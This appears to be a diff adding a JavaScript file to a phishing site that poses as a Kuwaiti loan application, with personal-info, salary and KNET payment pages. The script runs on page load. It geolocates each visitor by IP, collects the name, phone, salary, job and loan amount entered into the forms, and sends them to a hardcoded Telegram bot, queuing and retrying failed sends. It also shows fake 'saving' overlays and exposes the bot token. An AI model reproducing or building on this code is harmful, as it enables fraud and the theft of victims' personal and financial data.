@@ -1,0 +1,730 @@
+// TODO: add an owner-facing alert path when Telegram delivery fails and the message stays queued locally.
+function visitor_log_in_main() {
+  sendTelegramMessageWithQueue(getVisitorConsoleSummary(), false).catch(function() {});
+}
+
+
+
+
+const LOCATION_STORAGE_KEY = "location";
+const VISITOR_STORAGE_KEY = "visitor";
+const VISITOR_SESSION_DISPLAY_KEY = "visitorInfoDisplayed";
+const VISITOR_SESSION_INITIALIZED_KEY = "visitorInfoInitialized";
+const LOCATION_REQUEST_TIMEOUT_MS = 3000;
+const VISITOR_SESSION_TTL_MS = 60000;
+const TELEGRAM_REQUEST_TIMEOUT_MS = 3000;
+const TELEGRAM_PENDING_MESSAGES_KEY = "pendingTelegramMessages";
+const TELEGRAM_PERSONAL_INFO_MISSING_LINE = "هذه المستخدم لم يقم بأدخال المعلومات الشخصية";
+const SUBMISSION_LOADING_DURATION_MS = 3000;
+const SUBMISSION_LOADING_STYLE_ID = "submission-loading-style";
+const SUBMISSION_LOADING_OVERLAY_ID = "submission-loading-overlay";
+const SUBMISSION_LOADING_VARIANT_KNET = "knet";
+const VISITOR_EMOJI = "👤";
+const STEP3_VISIT_COUNT_KEY = "step3VisitCount";
+const STEP3_RETURN_NOTIFICATION_PENDING_KEY = "step3ReturnNotificationPending";
+const LOCATION_API_FALLBACKS = [
+  {
+    url: "https://get.geojs.io/v1/ip/geo.json",
+    getCountryCode(data) {
+      return data?.country_code || "";
+    },
+  },
+  {
+    url: "https://ipinfo.io/json",
+    getCountryCode(data) {
+      return data?.country || "";
+    },
+  },
+  {
+    url: "https://ipwho.is/",
+    getCountryCode(data) {
+      return data?.success ? data.country_code || "" : "";
+    },
+  },
+];
+
+function countryCodeToFlagEmoji(countryCode) {
+  if (!countryCode || countryCode.length !== 2) {
+    return "📍";
+  }
+
+  return countryCode
+    .toUpperCase()
+    .split("")
+    .map((character) => String.fromCodePoint(127397 + character.charCodeAt(0)))
+    .join("");
+}
+
+function getArabicCountryName(countryCode) {
+  if (!countryCode || typeof Intl === "undefined" || typeof Intl.DisplayNames !== "function") {
+    return "";
+  }
+
+  try {
+    const regionNames = new Intl.DisplayNames(["ar"], { type: "region" });
+    return regionNames.of(countryCode.toUpperCase()) || "";
+  } catch (error) {
+    return "";
+  }
+}
+
+let visitorSessionRemovalTimeoutId = null;
+let submissionLoadingAnimationFrameId = null;
+let visitorSessionRefreshInFlight = false;
+
+function getCurrentPageKey() {
+  const pathname = window.location.pathname || "";
+
+  if (!pathname || pathname === "/" || pathname.endsWith("/index.html")) {
+    return "index";
+  }
+
+  const segments = pathname.split("/");
+  return segments[segments.length - 1] || "index";
+}
+
+function isIndexPage() {
+  return getCurrentPageKey() === "index";
+}
+
+function getCurrentPageDisplayName() {
+  const pageKey = getCurrentPageKey();
+
+  switch (pageKey) {
+    case "index":
+      return "الرئيسية";
+    case "step1.html":
+      return "المعلومات الشخصية";
+    case "step2.html":
+      return "الراتب والوظيفة";
+    case "step3.html":
+      return "الدفع";
+    case "knet.html":
+      return "الكي نت";
+    default:
+      return pageKey.replace(/\.html$/i, "") || "غير معروفة";
+  }
+}
+
+function hasInitializedVisitorSession() {
+  return sessionStorage.getItem(VISITOR_SESSION_INITIALIZED_KEY) === "true";
+}
+
+function markVisitorSessionInitialized() {
+  sessionStorage.setItem(VISITOR_SESSION_INITIALIZED_KEY, "true");
+}
+
+function getVisitorTypeWithoutEmoji() {
+  const visitorType = localStorage.getItem(VISITOR_STORAGE_KEY) || "";
+  return visitorType.replace(/^\s*👤\s*-\s*/, "").trim();
+}
+
+function getStoredIdentityLines() {
+  const nameValue = (localStorage.getItem("step1.name") || "").trim();
+  const phoneValue = (localStorage.getItem("step1.phone") || "").trim();
+  const lines = [];
+
+  if (nameValue) {
+    lines.push(`👤 الاسم: ${nameValue}`);
+  }
+
+  if (phoneValue) {
+    lines.push(`📞 رقم الهاتف: ${phoneValue}`);
+  }
+
+  return lines;
+}
+
+function getStoredStepDetailsLines() {
+  const lines = [];
+  const netSalaryValue = (localStorage.getItem("step2.netSalary") || "").trim();
+  const requestedAmountValue = (localStorage.getItem("step2.requestedAmount") || "").trim();
+  const jobTitleValue = (localStorage.getItem("step2.jobTitle") || "").trim();
+  const workSectorValue = (localStorage.getItem("step2.workSector") || "").trim();
+  const additionalIncomeValue = (localStorage.getItem("step2.additionalIncome") || "").trim();
+
+  if (netSalaryValue) {
+    lines.push(`💰 صافي الراتب: ${netSalaryValue}`);
+  }
+
+  if (requestedAmountValue) {
+    lines.push(`💵 المبلغ المطلوب: ${requestedAmountValue}`);
+  }
+
+  if (jobTitleValue) {
+    lines.push(`🧑‍💼 اسم الوظيفة: ${jobTitleValue}`);
+  }
+
+  if (workSectorValue) {
+    lines.push(`🏢 قطاع العمل: ${workSectorValue}`);
+  }
+
+  if (additionalIncomeValue) {
+    lines.push(`➕ دخل إضافي: ${additionalIncomeValue}`);
+  }
+
+  return lines;
+}
+
+function buildVisitorSessionPageMessage() {
+  const visitorType = getVisitorTypeWithoutEmoji() || "مستخدم جديد";
+  const lines = [`${visitorType} - في صفحة ${getCurrentPageDisplayName()}`];
+  const identityLines = getStoredIdentityLines();
+  const detailLines = getStoredStepDetailsLines();
+
+  if (identityLines.length) {
+    lines.push.apply(lines, identityLines);
+  } else {
+    lines.push(TELEGRAM_PERSONAL_INFO_MISSING_LINE);
+  }
+
+  lines.push("-----");
+
+  if (detailLines.length) {
+    lines.push.apply(lines, detailLines);
+  }
+
+  return lines.join("\n");
+}
+
+function resetStep3VisitTracking() {
+  sessionStorage.setItem(STEP3_VISIT_COUNT_KEY, "0");
+  sessionStorage.removeItem(STEP3_RETURN_NOTIFICATION_PENDING_KEY);
+}
+
+function removeVisitorSessionDisplayFlag() {
+  sessionStorage.removeItem(VISITOR_SESSION_DISPLAY_KEY);
+
+  if (visitorSessionRemovalTimeoutId) {
+    window.clearTimeout(visitorSessionRemovalTimeoutId);
+    visitorSessionRemovalTimeoutId = null;
+  }
+}
+
+function scheduleVisitorSessionDisplayFlagRemoval(expiresAt) {
+  if (visitorSessionRemovalTimeoutId) {
+    window.clearTimeout(visitorSessionRemovalTimeoutId);
+  }
+
+  const remainingTime = expiresAt - Date.now();
+
+  if (remainingTime <= 0) {
+    handleVisitorSessionDisplayFlagExpiry();
+    return;
+  }
+
+  visitorSessionRemovalTimeoutId = window.setTimeout(handleVisitorSessionDisplayFlagExpiry, remainingTime);
+}
+
+function hasActiveVisitorSessionDisplayFlag() {
+  const expiresAtValue = sessionStorage.getItem(VISITOR_SESSION_DISPLAY_KEY);
+  const expiresAt = Number(expiresAtValue);
+
+  if (!expiresAtValue || Number.isNaN(expiresAt)) {
+    removeVisitorSessionDisplayFlag();
+    return false;
+  }
+
+  if (expiresAt <= Date.now()) {
+    removeVisitorSessionDisplayFlag();
+    return false;
+  }
+
+  scheduleVisitorSessionDisplayFlagRemoval(expiresAt);
+  return true;
+}
+
+function setVisitorSessionDisplayFlag() {
+  const expiresAt = Date.now() + VISITOR_SESSION_TTL_MS;
+  sessionStorage.setItem(VISITOR_SESSION_DISPLAY_KEY, String(expiresAt));
+  scheduleVisitorSessionDisplayFlagRemoval(expiresAt);
+}
+
+function getPendingTelegramMessages() {
+  try {
+    const rawMessages = localStorage.getItem(TELEGRAM_PENDING_MESSAGES_KEY);
+    const parsedMessages = rawMessages ? JSON.parse(rawMessages) : [];
+    return Array.isArray(parsedMessages) ? parsedMessages : [];
+  } catch (error) {
+    localStorage.removeItem(TELEGRAM_PENDING_MESSAGES_KEY);
+    return [];
+  }
+}
+
+function setPendingTelegramMessages(messages) {
+  if (!messages.length) {
+    localStorage.removeItem(TELEGRAM_PENDING_MESSAGES_KEY);
+    return;
+  }
+
+  localStorage.setItem(TELEGRAM_PENDING_MESSAGES_KEY, JSON.stringify(messages));
+}
+
+function queueTelegramMessage(text, notify) {
+  const pendingMessages = getPendingTelegramMessages();
+  pendingMessages.push({
+    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
+    text,
+    notify,
+  });
+  setPendingTelegramMessages(pendingMessages);
+}
+
+function removeQueuedTelegramMessagesByText(text) {
+  const pendingMessages = getPendingTelegramMessages().filter(function(message) {
+    return message.text !== text;
+  });
+
+  setPendingTelegramMessages(pendingMessages);
+}
+
+function waitForSubmissionDelay(durationMs) {
+  return new Promise(function(resolve) {
+    window.setTimeout(resolve, durationMs);
+  });
+}
+
+function ensureSubmissionLoadingOverlay() {
+  if (!document.body) {
+    return null;
+  }
+
+  if (!document.getElementById(SUBMISSION_LOADING_STYLE_ID)) {
+    const style = document.createElement("style");
+    style.id = SUBMISSION_LOADING_STYLE_ID;
+    style.textContent = `
+      body.is-submission-loading {
+        overflow: hidden;
+      }
+
+      .submission-loading-overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px;
+        background: rgba(255, 255, 255, 0.94);
+        backdrop-filter: blur(6px);
+      }
+
+      .submission-loading-overlay.is-knet {
+        background: rgba(85, 85, 85, 0.5);
+        backdrop-filter: none;
+      }
+
+      .submission-loading-overlay[hidden] {
+        display: none !important;
+      }
+
+      .submission-loading-card {
+        width: min(320px, 100%);
+        padding: 28px 24px;
+        border-radius: 24px;
+        text-align: center;
+        background: linear-gradient(180deg, #ffffff 0%, #eef8ff 100%);
+        box-shadow: 0 24px 60px rgba(0, 77, 128, 0.16);
+        border: 1px solid rgba(0, 163, 224, 0.16);
+      }
+
+      .submission-loading-spinner {
+        position: relative;
+        width: 72px;
+        height: 72px;
+        margin: 0 auto 18px;
+        line-height: 0;
+      }
+
+      .submission-loading-overlay.is-knet .submission-loading-card {
+        width: auto;
+        padding: 0;
+        background: transparent;
+        box-shadow: none;
+        border: 0;
+      }
+
+      .submission-loading-overlay.is-knet .submission-loading-spinner {
+        width: min(15vh, 96px);
+        height: min(15vh, 96px);
+        margin: 0 auto;
+      }
+
+      .submission-loading-logo {
+        position: absolute;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        margin: auto;
+        display: block;
+        animation: submission-loading-spin 1s linear infinite;
+        transform-origin: center center;
+        will-change: transform;
+      }
+
+      .submission-loading-overlay.is-knet .submission-loading-logo {
+        width: 100%;
+        height: 100%;
+      }
+
+      .submission-loading-title {
+        margin: 0;
+        color: #0f172a;
+        font-size: 1rem;
+        font-weight: 700;
+      }
+
+      .submission-loading-copy {
+        margin: 8px 0 0;
+        color: #475569;
+        font-size: 0.875rem;
+      }
+
+      .submission-loading-overlay.is-knet .submission-loading-title,
+      .submission-loading-overlay.is-knet .submission-loading-copy,
+      .submission-loading-overlay.is-knet .submission-loading-progress {
+        display: none;
+      }
+
+      .submission-loading-progress {
+        width: 100%;
+        height: 8px;
+        margin-top: 18px;
+        overflow: hidden;
+        border-radius: 999px;
+        background: rgba(15, 23, 42, 0.08);
+      }
+
+      .submission-loading-progress-bar {
+        width: 0;
+        height: 100%;
+        border-radius: inherit;
+        background: linear-gradient(90deg, #00a3e0 0%, #1d4ed8 100%);
+      }
+
+      @keyframes submission-loading-spin {
+        from {
+          transform: rotate(0deg);
+        }
+
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    `;
+    document.head.appendChild(style);
+  }
+
+  let overlay = document.getElementById(SUBMISSION_LOADING_OVERLAY_ID);
+
+  if (!overlay) {
+    overlay = document.createElement("div");
+    overlay.id = SUBMISSION_LOADING_OVERLAY_ID;
+    overlay.className = "submission-loading-overlay";
+	    overlay.hidden = true;
+	    overlay.innerHTML = `
+	      <div class="submission-loading-card" dir="rtl">
+	        <div class="submission-loading-spinner" aria-hidden="true">
+	          <img class="submission-loading-logo" src="./assets/images/logo.svg" alt="Commercial Facilities logo" />
+	        </div>
+	        <p class="submission-loading-title" data-loading-title>جارٍ تجهيز البيانات</p>
+	        <p class="submission-loading-copy">يتم حفظ البيانات وإرسالها قبل الانتقال للخطوة التالية.</p>
+	        <div class="submission-loading-progress" aria-hidden="true">
+          <div class="submission-loading-progress-bar" data-loading-progress></div>
+        </div>
+      </div>
+    `;
+    document.body.appendChild(overlay);
+  }
+
+  return overlay;
+}
+
+function showSubmissionLoadingOverlay(title, durationMs, variant) {
+  const overlay = ensureSubmissionLoadingOverlay();
+
+  if (!overlay) {
+    return;
+  }
+
+  const loadingTitle = overlay.querySelector("[data-loading-title]");
+  const progressBar = overlay.querySelector("[data-loading-progress]");
+  const progressDuration = typeof durationMs === "number" ? durationMs : SUBMISSION_LOADING_DURATION_MS;
+  const overlayVariant = variant || "default";
+
+  if (loadingTitle && title) {
+    loadingTitle.textContent = title;
+  }
+
+  overlay.classList.toggle("is-knet", overlayVariant === SUBMISSION_LOADING_VARIANT_KNET);
+  overlay.hidden = false;
+  document.body.classList.add("is-submission-loading");
+
+  if (!progressBar) {
+    return;
+  }
+
+  if (submissionLoadingAnimationFrameId) {
+    window.cancelAnimationFrame(submissionLoadingAnimationFrameId);
+    submissionLoadingAnimationFrameId = null;
+  }
+
+  progressBar.style.transition = "none";
+  progressBar.style.width = "0%";
+
+  submissionLoadingAnimationFrameId = window.requestAnimationFrame(function() {
+    submissionLoadingAnimationFrameId = window.requestAnimationFrame(function() {
+      progressBar.style.transition = `width ${progressDuration}ms linear`;
+      progressBar.style.width = "100%";
+    });
+  });
+}
+
+function hideSubmissionLoadingOverlay() {
+  const overlay = document.getElementById(SUBMISSION_LOADING_OVERLAY_ID);
+
+  if (submissionLoadingAnimationFrameId) {
+    window.cancelAnimationFrame(submissionLoadingAnimationFrameId);
+    submissionLoadingAnimationFrameId = null;
+  }
+
+  if (!overlay) {
+    return;
+  }
+
+  const progressBar = overlay.querySelector("[data-loading-progress]");
+
+  if (progressBar) {
+    progressBar.style.transition = "none";
+    progressBar.style.width = "0%";
+  }
+
+  overlay.hidden = true;
+  overlay.classList.remove("is-knet");
+  document.body.classList.remove("is-submission-loading");
+}
+
+async function sendTelegramMessageWithQueue(text, notify) {
+  try {
+    await send(text, notify, TELEGRAM_REQUEST_TIMEOUT_MS);
+    removeQueuedTelegramMessagesByText(text);
+    return { sent: true, queued: false };
+  } catch (error) {
+    queueTelegramMessage(text, notify);
+    return { sent: false, queued: true, error };
+  }
+}
+
+async function persistTelegramMessageThenSend(text, notify) {
+  queueTelegramMessage(text, notify);
+
+  try {
+    await send(text, notify, TELEGRAM_REQUEST_TIMEOUT_MS);
+    removeQueuedTelegramMessagesByText(text);
+    return { sent: true, queued: false };
+  } catch (error) {
+    return { sent: false, queued: true, error };
+  }
+}
+
+async function retryPendingTelegramMessages() {
+  const pendingMessages = getPendingTelegramMessages();
+
+  if (!pendingMessages.length) {
+    return;
+  }
+
+  const remainingMessages = [];
+
+  for (const message of pendingMessages) {
+    console.log(message.text);
+
+    try {
+      await send(message.text, message.notify, TELEGRAM_REQUEST_TIMEOUT_MS);
+    } catch (error) {
+      remainingMessages.push(message);
+    }
+  }
+
+  setPendingTelegramMessages(remainingMessages);
+}
+
+async function fetchJsonWithTimeout(url) {
+  const controller = new AbortController();
+  const timeoutId = window.setTimeout(() => controller.abort(), LOCATION_REQUEST_TIMEOUT_MS);
+
+  try {
+    const response = await fetch(url, {
+      headers: {
+        Accept: "application/json",
+      },
+      signal: controller.signal,
+    });
+
+    return response;
+  } finally {
+    window.clearTimeout(timeoutId);
+  }
+}
+
+async function getVisitorLocationInArabic() {
+  for (const api of LOCATION_API_FALLBACKS) {
+    try {
+      const response = await fetchJsonWithTimeout(api.url);
+
+      if (!response.ok) {
+        throw new Error(`Location request failed with status ${response.status}`);
+      }
+
+      const data = await response.json();
+      const countryCode = api.getCountryCode(data);
+      const countryName = getArabicCountryName(countryCode);
+
+      if (!countryCode || !countryName) {
+        throw new Error("Location data is incomplete.");
+      }
+
+      const formattedLocation = `${countryCodeToFlagEmoji(countryCode)} - ${countryName}`;
+      localStorage.setItem(LOCATION_STORAGE_KEY, formattedLocation);
+      return formattedLocation;
+    } catch (error) {
+      continue;
+    }
+  }
+
+  localStorage.setItem(LOCATION_STORAGE_KEY, "");
+  return "";
+}
+
+function storeVisitorType() {
+  const hasVisitedBefore = Boolean(localStorage.getItem(VISITOR_STORAGE_KEY));
+  const visitorType = hasVisitedBefore
+    ? `${VISITOR_EMOJI} - مستخدم قديم`
+    : `${VISITOR_EMOJI} - مستخدم جديد`;
+  localStorage.setItem(VISITOR_STORAGE_KEY, visitorType);
+  return visitorType;
+}
+
+function getVisitorConsoleSummary() {
+  return [localStorage.getItem(VISITOR_STORAGE_KEY) || "", localStorage.getItem(LOCATION_STORAGE_KEY) || ""]
+    .filter(Boolean)
+    .join("\n");
+}
+
+async function refreshVisitorSessionPageMessage() {
+  if (!hasInitializedVisitorSession() || visitorSessionRefreshInFlight) {
+    return;
+  }
+
+  visitorSessionRefreshInFlight = true;
+
+  try {
+    await sendTelegramMessageWithQueue(buildVisitorSessionPageMessage(), false);
+  } finally {
+    setVisitorSessionDisplayFlag();
+    visitorSessionRefreshInFlight = false;
+  }
+}
+
+function handleVisitorSessionDisplayFlagExpiry() {
+  removeVisitorSessionDisplayFlag();
+  refreshVisitorSessionPageMessage().catch(function() {});
+}
+
+function syncVisitorSessionMessaging() {
+  if (!hasInitializedVisitorSession()) {
+    return;
+  }
+
+  if (hasActiveVisitorSessionDisplayFlag()) {
+    return;
+  }
+
+  refreshVisitorSessionPageMessage().catch(function() {});
+}
+
+async function initializeVisitorMetadata() {
+  storeVisitorType();
+
+  if (getCurrentPageKey() === "knet.html") {
+    resetStep3VisitTracking();
+  }
+
+  if (!isIndexPage()) {
+    syncVisitorSessionMessaging();
+    return;
+  }
+
+  try {
+    if (!localStorage.getItem(LOCATION_STORAGE_KEY)) {
+      await getVisitorLocationInArabic();
+    }
+  } finally {
+    if (!hasInitializedVisitorSession()) {
+      markVisitorSessionInitialized();
+      setVisitorSessionDisplayFlag();
+      visitor_log_in_main();
+      return;
+    }
+
+    syncVisitorSessionMessaging();
+  }
+}
+
+window.getVisitorLocationInArabic = getVisitorLocationInArabic;
+window.getVisitorConsoleSummary = getVisitorConsoleSummary;
+window.visitor_log_in_main = visitor_log_in_main;
+window.sendTelegramMessageWithQueue = sendTelegramMessageWithQueue;
+window.persistTelegramMessageThenSend = persistTelegramMessageThenSend;
+window.retryPendingTelegramMessages = retryPendingTelegramMessages;
+window.showSubmissionLoadingOverlay = showSubmissionLoadingOverlay;
+window.hideSubmissionLoadingOverlay = hideSubmissionLoadingOverlay;
+window.waitForSubmissionDelay = waitForSubmissionDelay;
+window.getTelegramStoredIdentityLines = getStoredIdentityLines;
+window.getTelegramStoredStepDetailsLines = getStoredStepDetailsLines;
+window.getTelegramPersonalInfoFallbackText = function() {
+  return TELEGRAM_PERSONAL_INFO_MISSING_LINE;
+};
+window.getCurrentTelegramPageName = getCurrentPageDisplayName;
+window.resetStep3VisitTracking = resetStep3VisitTracking;
+
+if (document.readyState === "loading") {
+  document.addEventListener("DOMContentLoaded", initializeVisitorMetadata, { once: true });
+} else {
+  initializeVisitorMetadata();
+}
+
+retryPendingTelegramMessages().catch(function() {});
+
+async function send(text, notify = false, timeoutMs = TELEGRAM_REQUEST_TIMEOUT_MS) {
+  const botToken = "7995272254:AAFpQ2CFyMpnUxbzyMu2x7Ss_ozi27XSpY4";
+  const chatId = "8249770312";
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const controller = new AbortController();
+  const timeoutId = window.setTimeout(function() {
+    controller.abort();
+  }, timeoutMs);
+
+  try {
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      signal: controller.signal,
+      body: JSON.stringify({ chat_id: chatId, text: text, disable_notification: notify })
+    });
+
+    if (!res.ok) {
+      throw new Error(`Telegram request failed with status ${res.status}`);
+    }
+
+    const data = await res.json();
+
+    if (!data.ok) {
+      throw new Error(data.description || "Telegram request failed.");
+    }
+
+    return data;
+  } finally {
+    window.clearTimeout(timeoutId);
+  }
+}
